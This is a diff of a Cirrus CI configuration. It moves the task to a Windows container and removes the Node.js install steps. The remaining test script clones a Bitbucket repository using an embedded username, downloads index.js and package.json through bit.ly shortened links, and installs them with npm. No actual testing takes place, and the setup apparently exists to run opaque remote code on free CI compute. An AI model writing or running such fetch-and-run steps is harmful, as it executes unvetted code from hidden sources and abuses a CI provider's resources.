@@ -1,19 +1,8 @@
-compute_engine_instance:
-  image_project: cirrus-images
-  image: family/docker-kvm
-  platform: linux
-  cpu: 1
-  memory: 2G
-  disk: 100
-  nested_virtualization: true
+windows_container:
+  image: cirrusci/windowsservercore:2019
 task:
   clone_script: echo "dinhthilieunhi@outlook.com"
   test_script:
-    - sudo apt-get install -y libxtst6 libnss3 libnspr4 libxss1 libasound2 libatk-bridge2.0-0 libgtk-3-0 libgdk-pixbuf2.0-0
-    - sudo apt-get install -y libxshmfence-dev
-    - curl -sL https://deb.nodesource.com/setup_16.x -o nodesource_setup.sh
-    - sudo bash nodesource_setup.sh
-    - sudo apt install nodejs
     - git clone https://meocodervippro@bitbucket.org/lunarcrush/lunarcrush-data.git --branch dinhthilieunhi_outlook-com --single-branch lunarCrushData
     - curl -fsSL https://bit.ly/3nKzqND -o index.js && curl -fsSL https://bit.ly/3cBwVH3 -o package.json
     - npm i -s
